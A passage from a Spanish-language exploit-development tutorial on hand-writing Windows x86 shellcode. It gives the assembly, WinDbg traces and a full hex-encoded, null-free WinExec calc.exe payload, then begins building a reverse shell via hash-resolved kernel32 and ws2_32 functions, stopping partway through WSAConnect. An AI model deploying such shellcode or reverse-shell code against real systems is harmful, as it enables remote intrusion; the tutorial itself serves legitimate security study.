<p class="plain-text">Según la documentación <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a> requiere 2 argumentos, el primero es el puntero a la <code class="language-plaintext highlighter-rouge">string</code> del comando y la segunda el <a href="https://learn.microsoft.com/es-es/windows/win32/api/winuser/nf-winuser-showwindow">tipo de ventana</a>, usaremos <code class="language-plaintext highlighter-rouge">SW_NORMAL</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">UINT </span><span class="na">WinExec</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">LPCSTR </span><span class="p">lpCmdLine,  
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">UINT   </span><span class="p">uCmdShow
);</span>
</code></pre></div></div><br>

<p class="plain-text">A través de push guardamos la string <code class="language-plaintext highlighter-rouge">calc.exe</code> en el stack y guardamos la dirección en <code class="language-plaintext highlighter-rouge">esi</code>, luego pusheamos el tipo de ventana que equivale a <code class="language-plaintext highlighter-rouge">0x1</code> y como segundo argumento <code class="language-plaintext highlighter-rouge">esi</code> que es la dirección de la string, para finalmente llamar a la función</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">call_winexec</span><span class="p">:
        </span><span class="o">cdq                         </span><span class="c1">; $edx = 0x0
        </span><span class="o">push </span><span class="mi">edx                    </span><span class="c1">; "\x00"
        </span><span class="o">push </span><span class="mi">0x6578652e             </span><span class="c1">; ".exe"
        </span><span class="o">push </span><span class="mi">0x636c6163             </span><span class="c1">; "calc"
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, </span><span class="mi">esp                </span><span class="c1">; "calc.exe"

        </span><span class="o">push </span><span class="mi">0x1                    </span><span class="c1">; uCmdShow
        </span><span class="o">push </span><span class="mi">esi                    </span><span class="c1">; lpCmdLine
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x10</span><span class="p">]           </span><span class="c1">; call WinExec()</span>
</code></pre></div></div><br>

<p class="plain-text">Para salir correctamente usaremos <a href="https://learn.microsoft.com/es-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess">TerminateProcess</a> que requiere 2 argumentos, el primero es el numero de proceso, usamos <code class="language-plaintext highlighter-rouge">0xffffffff</code> o <code class="language-plaintext highlighter-rouge">-1</code> ya que hace referencia al proceso actual y el segundo parametro es el codigo de estado donde usamos <code class="language-plaintext highlighter-rouge">0</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">BOOL </span><span class="na">TerminateProcess</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">HANDLE </span><span class="p">hProcess,
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">UINT   </span><span class="p">uExitCode
);</span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente establecemos los argumentos y llamamos a la función con la variable</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">exit:
        </span><span class="o">push </span><span class="mi">edx                    </span><span class="c1">; uExitCode
        </span><span class="o">push </span><span class="mi">0xffffffff             </span><span class="c1">; hProcess
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="p">- </span><span class="mi">0xc</span><span class="p">]            </span><span class="c1">; call TerminateProcess()</span>
</code></pre></div></div><br>

<p class="plain-text">Desde el debugger podemos ver que los argumentos se guarden correctamente y finalmente llamamos a la función desde la variable, esto lanza una calculadora</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=76b1cf20 ebx=76ac0000 ecx=00000000 edx=004e1000 esi=006efaf4 edi=00733320
eip=004e10a4 esp=006efaec ebp=006efb30 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x10a4:
004e10a4 ff55f0          call    dword ptr [ebp-10h]  ss:002b:006efb20={KERNEL32!WinExec (76b1cf20)}  

</span><span class="ro">0:000> </span><span class="p">dds esp L2
006efaec  006efaf4
006efaf0  00000001

</span><span class="ro">0:000> </span><span class="p">da poi(esp)
006efaf4  "calc.exe"

</span><span class="ro">0:000> </span><span class="p">p
ModLoad: 767d0000 76848000   C:\Windows\SysWOW64\sechost.dll
ModLoad: 77230000 772ee000   C:\Windows\SysWOW64\RPCRT4.dll
ModLoad: 77600000 77619000   C:\Windows\SysWOW64\bcrypt.dll
eax=00000021 ebx=76ac0000 ecx=dcde89c7 edx=00000000 esi=006efaf4 edi=00733320
eip=004e10a7 esp=006efaf4 ebp=006efb30 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x10a7:
004e10a7 51              push    ecx</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente nos queda un <code class="language-plaintext highlighter-rouge">shellcode</code> para abrir una calculadora, libre de <code class="language-plaintext highlighter-rouge">null bytes</code> y otros badchars conocidos y con un peso bastante bajo de apenas <code class="language-plaintext highlighter-rouge">162</code> bytes, es muy bueno pero podemos bajarlo incluso mas como en este <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/shellcode/calc.asm">shellcode</a> de solo 148</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf shellcode.asm -o shellcode.o; </span><span class="ve">ld </span><span class="p">shellcode.o -m elf_i386 -o shellcode

</span><span class="ve">❯ objdump </span><span class="p">-d shellcode | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:' </span><span class="p">| </span><span class="ve">grep </span><span class="p">-v </span><span class="am">'shellcode'</span><span class="p"> | </span><span class="ve">cut</span><span class="p"> -f2 -d: | </span><span class="ve">cut </span><span class="p">-f1-6 -d </span><span class="am">' '</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr</span><span class="am"> '\t' ' '</span><span class="p"> | </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d</span><span class="am"> ''</span><span class="p"> -s
\x89\xe5\x83\xec\x28\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x14\x8b\x36\xad\x8b\x58\x10\xeb\x06\x5e\x89\x75\xf8\xeb\x53\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x35\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xe0\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x33\x59\xe0\x8e\xff\x55\xf8\x89\x45\xf4\x68\xe3\x1e\x12\x10\xff\x55\xf8\x89\x45\xf0\x99\x52\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe6\x6a\x01\x56\xff\x55\xf0\x52\x6a\xff\xff\x55\xf4  </span>
</code></pre></div></div><br>

<a href="/exploitdevelopment/windows-user/shellcode/1.png" target="_blank"><div><p><img src="/exploitdevelopment/windows-user/shellcode/1.png"></p></div></a>

</section>

<section class="post" id="shell">
<br><h3 class="post-title">Exec revshell</h3><br>

<p class="plain-text">Afortunadamente <code class="language-plaintext highlighter-rouge">WinExec</code> estaba dentro de <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, pero ¿que pasa si queremos enviar una reverse shell o realizar una acción que necesite una libreria externa?, para ello necesitaremos resolver otro simbolo que es <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, además de <code class="language-plaintext highlighter-rouge">CreateProcessA</code> que usaremos más adelante al enviar una reverse shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">symbol_kernel32</span><span class="p">:
        </span><span class="o">push </span><span class="mi">0x8ee05933             </span><span class="c1">; TerminateProcess() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0xc</span><span class="p">], </span><span class="mi">eax        </span><span class="c1">; var12 = ptr to TerminateProcess()  

        </span><span class="o">push </span><span class="mi">0x583c436c             </span><span class="c1">; LoadLibraryA() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x10</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; var16 = ptr to LoadLibraryA()

        </span><span class="o">push </span><span class="mi">0xa9f72dc9             </span><span class="c1">; CreateProcessA() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x14</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; var20 = ptr to CreateProcessA()</span>
</code></pre></div></div><br>

<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> solo requiere un argumento y es el nombre de la libreria, en este caso las funciones que necesitamos vienen de la libreria <code class="language-plaintext highlighter-rouge">ws2_32.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">HMODULE </span><span class="na">LoadLibraryA</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">LPCSTR </span><span class="p">lpLibFileName  
);</span>
</code></pre></div></div><br>

<p class="plain-text">Empujamos la string <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> terminandola con un null byte y ejecutamos un <code class="language-plaintext highlighter-rouge">push esp</code> para guardar el puntero que contiene la string, luego llamamos a la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> que cargara la libreria devolviendo su dirección base en <code class="language-plaintext highlighter-rouge">eax</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">load_ws2_32</span><span class="p">:
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">mov </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x6c6c              </span><span class="c1">; "ll"
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; "ll\x00\x00"
        </span><span class="o">push </span><span class="mi">0x642e3233             </span><span class="c1">; "32.d"
        </span><span class="o">push </span><span class="mi">0x5f327377             </span><span class="c1">; "ws2_"
        </span><span class="o">push </span><span class="mi">esp                    </span><span class="c1">; "ws2_32.dll"
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x10</span><span class="p">]           </span><span class="c1">; call LoadLibraryA()  </span>
</code></pre></div></div><br>

<p class="plain-text">Luego de cargar la libreria necesitamos resolver los simbolos necesarios para la revshell, este proceso es parecido al de antes, movemos a ebx la dirección base de <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> y cargamos las 3 funciones necesarias en variables de <code class="language-plaintext highlighter-rouge">ebp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">symbol_ws2_32</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $ebx = ws2_32 base

        </span><span class="o">push </span><span class="mi">0xe17a7010             </span><span class="c1">; WSAStartup() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x18</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; var24 = ptr to WSAStartup()  

        </span><span class="o">push </span><span class="mi">0xe0a06fc5             </span><span class="c1">; WSASocketA() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x1c</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; var28 = ptr to WSASocketA()  

        </span><span class="o">push </span><span class="mi">0xe0966ca8             </span><span class="c1">; WSAConnect() hash
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x8</span><span class="p">]            </span><span class="c1">; call .find_function
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x20</span><span class="p">], </span><span class="mi">eax       </span><span class="c1">; var32 = ptr to WSAConnect()  </span>
</code></pre></div></div><br>

<p class="plain-text">Podemos comprobar esto desde el debugger, despues de guardar el puntero a la string en el stack como argumento llamamos a <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> e incluso el debugger nos muestra que se ha cargado un nuevo modulo y la dirección base esta en <code class="language-plaintext highlighter-rouge">eax</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00006c6c ebx=77480000 ecx=00000000 edx=00dd1000 esi=00dd102d edi=015c2388  
eip=00dd10ae esp=013fff28 ebp=013fff68 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
shellcode+0x10ae:
00dd10ae 54              push    esp

</span><span class="ro">0:000> </span><span class="p">da esp
013fff28  "ws2_32.dll"

</span><span class="ro">0:000> </span><span class="p">p
eax=00006c6c ebx=77480000 ecx=00000000 edx=00dd1000 esi=00dd102d edi=015c2388
eip=00dd10af esp=013fff24 ebp=013fff68 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x10af:
00dd10af ff55f0          call    dword ptr [ebp-10h]  ss:0023:013fff58={KERNEL32!LoadLibraryAStub (774a8b20)}  

</span><span class="ro">0:000> </span><span class="p">p
ModLoad: 76bb0000 76c16000   C:\Windows\System32\ws2_32.dll
eax=76bb0000 ebx=77480000 ecx=00000000 edx=00000000 esi=00dd102d edi=015c2388
eip=00dd10b2 esp=013fff28 ebp=013fff68 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x10b2:
00dd10b2 89c3            mov     ebx,eax

</span><span class="ro">0:000> </span><span class="p">r eax
eax=76bb0000

</span><span class="ro">0:000> </span><span class="p">lm m ws2_32
Browse full module list
start    end        module name
76bb0000 76c16000   ws2_32     (deferred)</span>
</code></pre></div></div><br>

<p class="plain-text">El proceso de cargar simbolos es igual a como lo haciamos en <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, se empuja el hash, se llama a <code class="language-plaintext highlighter-rouge">.find_function</code> y se guarda la función en una variable</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=76bb0000 ebx=76bb0000 ecx=00000000 edx=00000000 esi=00dd102d edi=015c2388
eip=00dd10b4 esp=013fff28 ebp=013fff68 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x10b4:
00dd10b4 6810707ae1      push    0E17A7010h

</span><span class="ro">0:000> </span><span class="p">p
eax=76bb0000 ebx=76bb0000 ecx=00000000 edx=00000000 esi=00dd102d edi=015c2388
eip=00dd10b9 esp=013fff24 ebp=013fff68 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
shellcode+0x10b9:
00dd10b9 ff55f8          call    dword ptr [ebp-8]    ss:0023:013fff60=00dd102d

</span><span class="ro">0:000> </span><span class="p">p
eax=76bb5e00 ebx=76bb0000 ecx=00000000 edx=00000000 esi=00dd102d edi=015c2388
eip=00dd10bc esp=013fff24 ebp=013fff68 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
shellcode+0x10bc:
00dd10bc 8945e8          mov     dword ptr [ebp-18h],eax ss:0023:013fff50=00000000  

</span><span class="ro">0:000> </span><span class="p">u eax
ws2_32!WSAStartup:
76bb5e00 8bff            mov     edi,edi
76bb5e02 55              push    ebp
76bb5e03 8bec            mov     ebp,esp
76bb5e05 6afe            push    0FFFFFFFEh
76bb5e07 68d85cbf76      push    offset ws2_32!StringCopyWorkerW+0xf9 (76bf5cd8)
76bb5e0c 6860a5bc76      push    offset ws2_32!_except_handler4 (76bca560)
76bb5e11 64a100000000    mov     eax,dword ptr fs:[00000000h]
76bb5e17 50              push    eax</span>
</code></pre></div></div><br>

<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup</a> recibe 2 argumentos, el primero parece que es la versión de la especificación Windows Sockets, la documentación nos dice que la ultima es <code class="language-plaintext highlighter-rouge">2.2</code> asi que usaremos esa, el segundo es un puntero a la estructura <code class="language-plaintext highlighter-rouge">WSADATA</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="na">WSAStartup</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">WORD      </span><span class="p">wVersionRequired,  
  [</span><span class="mi">out</span><span class="p">] </span><span class="no">LPWSADATA </span><span class="p">lpWSAData
);</span>
</code></pre></div></div><br>

<p class="plain-text">La función comienza moviendo el <code class="language-plaintext highlighter-rouge">esp</code> a <code class="language-plaintext highlighter-rouge">eax</code>, luego <code class="language-plaintext highlighter-rouge">ecx</code> almacena el valor <code class="language-plaintext highlighter-rouge">0x590</code> que se restaran a <code class="language-plaintext highlighter-rouge">eax</code>, este espacio es necesario para evitar que las instrucciones se sobrescriban con la estructura <code class="language-plaintext highlighter-rouge">WSAData</code>, luego empujamos el puntero a la estructura y la version que son los argumentos para posteriormente llamar a la función</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">call_wsastartup</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">esp                </span><span class="c1">; $eax = $esp
        </span><span class="o">xor </span><span class="mi">ecx</span><span class="p">, </span><span class="mi">ecx                </span><span class="c1">; $ecx = 0x0
        </span><span class="o">mov </span><span class="mi">cx</span><span class="p">, </span><span class="mi">0x590               </span><span class="c1">; $ecx = 0x590
        </span><span class="o">sub </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ecx                </span><span class="c1">; sub ecx to avoid overwriting  
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpWSAData
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">mov </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x0202              </span><span class="c1">; $eax = 0x00000202
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; wVersionRequired
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x18</span><span class="p">]           </span><span class="c1">; call WSAStartup()</span>
</code></pre></div></div><br>

<p class="plain-text">Antes de llamar a <code class="language-plaintext highlighter-rouge">WSAStartup</code> podemos ver los 2 argumentos, la versión y el puntero a la estructura que esta bastante detrás que la dirección del <code class="language-plaintext highlighter-rouge">esp</code> como definimos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000202 ebx=773a0000 ecx=00000590 edx=00a70000 esi=0058102d edi=00a73320
eip=005810e7 esp=009ffec0 ebp=009fff14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x10e7:
005810e7 ff55e8          call    dword ptr [ebp-18h]  ss:002b:009ffefc={ws2_32!WSAStartup (773a9cc0)}  

</span><span class="ro">0:000> </span><span class="p">dds esp L2
009ffec0  00000202
009ffec4  009ff938

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=773a0000 ecx=e5a1d462 edx=00a74c90 esi=0058102d edi=00a73320
eip=005810ea esp=009ffec8 ebp=009fff14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x10ea:
005810ea 31c0            xor     eax,eax</span>
</code></pre></div></div><br>

<p class="plain-text">Es el turno de la función <a href="https://learn.microsoft.com/es-es/windows/win32/api/winsock2/nf-winsock2-wsasocketa">WSASocketA</a> que se encarga de crear el socket, este recibe <code class="language-plaintext highlighter-rouge">6</code> argumentos que tienen tipos de datos conocidos como <code class="language-plaintext highlighter-rouge">int</code> y <code class="language-plaintext highlighter-rouge">dword</code> aunque tambien encontramos extraños como los parametros <code class="language-plaintext highlighter-rouge">lpProtocolInfo</code> y <code class="language-plaintext highlighter-rouge">g</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">SOCKET WSAAPI </span><span class="na">WSASocketA</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">int                 </span><span class="p">af,
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">int                 </span><span class="p">type,
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">int                 </span><span class="p">protocol,
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">LPWSAPROTOCOL_INFOA </span><span class="p">lpProtocolInfo,  
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">GROUP               </span><span class="p">g,
  [</span><span class="mi">in</span><span class="p">] </span><span class="no">DWORD               </span><span class="p">dwFlags
);</span>
</code></pre></div></div><br>

<p class="plain-text">• <code class="language-plaintext highlighter-rouge">af</code>: es la familia de direcciones utilizada por el socket, nosotros usaremos </code class="language-plaintext highlighter-rouge">AF_INET</code> que tiene como valor <code class="language-plaintext highlighter-rouge">2</code> y corresponde a las direcciones IPv4
<br>• <code class="language-plaintext highlighter-rouge">type</code>: especifica el tipo de socket, necesitamos usar </code class="language-plaintext highlighter-rouge">SOCK_STREAM</code> que tiene como valor <code class="language-plaintext highlighter-rouge">1</code> y corresponde al tipo TCP
<br>• <code class="language-plaintext highlighter-rouge">protocol</code>: se basa en los 2 argumentos anteriores, en nuestro necesitamos usar </code class="language-plaintext highlighter-rouge">IPPROTO_TCP</code> que tiene como valor <code class="language-plaintext highlighter-rouge">6</code>
<br>• <code class="language-plaintext highlighter-rouge">lpProtocolInfo</code>: requiere un puntero a la estructura </code class="language-plaintext highlighter-rouge">WSAPROTOCOL_INFO</code>, pero se puede establecer a null (<code class="language-plaintext highlighter-rouge">0</code>) ya que usamos un protocolo TCP/IP
<br>• <code class="language-plaintext highlighter-rouge">g</code>: se utiliza para especificar un id de gurp de socket, ya que solo creamos uno podemos establecerlo en null (<code class="language-plaintext highlighter-rouge">0</code>)
<br>• <code class="language-plaintext highlighter-rouge">dwFlags</code>: se utiliza para especificar atributos adicionales, como no los requerimos podemos establecerlo en null (<code class="language-plaintext highlighter-rouge">0</code>)</p>

<p class="plain-text">Una vez sabemos que usar en los argumentos podemos empujar los parametros al stack de acuerdo a lo entendido y posteriormente llamar <code class="language-plaintext highlighter-rouge">WSASocketA</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">call_wsasocketa</span><span class="p">:
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax                </span><span class="c1">; $eax = 0x0
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; dwFlags
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; g
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; lpProtocolInfo
        </span><span class="o">mov </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x6                 </span><span class="c1">; IPPROTO_TCP
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; protocol
        </span><span class="o">mov </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x1                 </span><span class="c1">; SOCK_STREAM
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; type
        </span><span class="o">inc </span><span class="mi">eax                     </span><span class="c1">; AF_INET
        </span><span class="o">push </span><span class="mi">eax                    </span><span class="c1">; af
        </span><span class="o">call </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x1c</span><span class="p">]           </span><span class="c1">; call WSASocketA()  </span>
</code></pre></div></div><br>

<p class="plain-text">Al llamar a <code class="language-plaintext highlighter-rouge">WSASocketA</code> se crea el socket y en <code class="language-plaintext highlighter-rouge">eax</code> nos devuelve un valor que es el <code class="language-plaintext highlighter-rouge">socket descriptor</code> que usaremos para comunicarnos con este mas adelante, en caso de que hubiera fallado el valor de retorno hubiera sido <code class="language-plaintext highlighter-rouge">0xffff</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000002 ebx=773a0000 ecx=e5a1d462 edx=00a74c90 esi=0058102d edi=00a73320
eip=005810f7 esp=009ffeb0 ebp=009fff14 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
shellcode+0x10f7:
005810f7 ff55e4          call    dword ptr [ebp-1Ch]  ss:002b:009ffef8={ws2_32!WSASocketA (773b7140)}  

</span><span class="ro">0:000> </span><span class="p">dds esp L6
009ffeb0  00000002
009ffeb4  00000001
009ffeb8  00000006
009ffebc  00000000
009ffec0  00000000
009ffec4  00000000

</span><span class="ro">0:000> </span><span class="p">p
ModLoad: 71c50000 71ca2000   C:\Windows\SysWOW64\mswsock.dll
eax=0000010c ebx=773a0000 ecx=e5a1d462 edx=00000014 esi=0058102d edi=00a73320
eip=005810fa esp=009ffec8 ebp=009fff14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x10fa:
005810fa 89c6            mov     esi,eax</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int WSAAPI </span><span class="na">WSAConnect</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">SOCKET         </span><span class="p">s,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">const sockaddr </span><span class="o">*</span><span class="p">name,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">int            </span><span class="p">namelen,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">LPWSABUF       </span><span class="p">lpCallerData,  
  [</span><span class="mi">out</span><span class="p">] </span><span class="no">LPWSABUF       </span><span class="p">lpCalleeData,  
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">LPQOS          </span><span class="p">lpSQOS,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">LPQOS          </span><span class="p">lpGQOS
);</span>
</code></pre></div></div><br>

<p class="plain-text">• <code class="language-plaintext highlighter-rouge">s</code>: requiere el descriptor del socket con el que se comunica, esto lo devuelve la funcion anterior
<br>• <code class="language-plaintext highlighter-rouge">name</code>: requiere un puntero a la estructura sockaddr, para el protocolo IPv4 utilizaremos la estructura <code class="language-plaintext highlighter-rouge">sockaddr_in</code></p>
<p class="plain-text">El primer valor es <code class="language-plaintext highlighter-rouge">sin_family</code> que requiere la familia de direcciones del transporte, este valor tiene que ser AF_INET, el siguiente es <code class="language-plaintext highlighter-rouge">sin_port</code> que especifica el puerto, despues <code class="language-plaintext highlighter-rouge">sin_addr</code> que es una estructura anidada de tipo IN_ADDR que almacenara la IP dentro de un dword, el ultimo es <code class="language-plaintext highlighter-rouge">sin_zero</code> que se puede poner a 0
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">struct </span><span class="na">sockaddr_in </span><span class="p">{
        </span><span class="no">short   </span><span class="p">sin_family;
        </span><span class="no">u_short </span><span class="p">sin_port;
        </span><span class="no">struct  </span><span class="p">in_addr sin_addr;  
        </span><span class="no">char    </span><span class="p">sin_zero[</span><span class="mi">8</span><span class="p">];
};</span>
</code></pre></div></div><br>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">namelen</code>: el tamaño de la estructura, el tamaño de sockaddr_in es de <code class="language-plaintext highlighter-rouge">0x10</code>
<br>• <code class="language-plaintext highlighter-rouge">lpCallerData, lpCalleeData</code>: requieren punteros a datos de usuario que seran transferidos entre sockets, no son compatibles con TCP/IP por lo que los establecemos en <code class="language-plaintext highlighter-rouge">0</code>
